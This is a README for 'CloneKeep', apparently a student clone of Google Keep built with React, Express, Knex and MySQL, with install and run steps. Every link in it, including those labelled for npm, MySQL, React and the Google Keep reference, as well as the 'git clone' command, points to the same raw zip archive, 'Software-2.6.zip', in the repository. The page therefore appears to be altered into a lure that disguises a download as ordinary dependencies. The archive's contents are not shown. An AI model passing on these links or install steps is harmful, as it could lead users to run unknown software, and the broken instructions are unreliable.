# CloneKeep

A clone of some of the functions of [Google Keep](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

- [https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed on your machine
- [npm](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) (Node Package Manager)
- [knex](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed a global package
  - `npm install -g knex`
- [Mysql](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed and a database created.

### Installing 

- Clone the repository to your local machine:
    
   `git clone https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip`

- Navigate to the Backend Folder
  
    `cd CloneKeepApi`
  
  - Install dependencies
  
    `npm install`

  - Update your .env file with your database info
  
  - Run migration
    
    `knex migrate:latest --env production `

- Navigate to the Frontend Folder
  - `cd ..`
  - `cd CloneKeepApp`
  
  - Install dependencies

    `npm install` 

### Running the App 

Start the development server:
    `npm start`

The app will be available at http://localhost:3000 in your browser.

### Running the Server

Start the development server:
    `npm start`
    or 
    `npm run watch #to run with nodemon for development` 

The server will be available at http://localhost:5000.

### Built With

- [React](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
- [Express](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
- [Knex](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
- [Mysql](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
- [Multer](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
- [Mui](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
- [UUID](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)

### About the Project

This project was created as part of studying and comprehending the React environment. It also serves as an opportunity to explore and use the MUI framework for styling.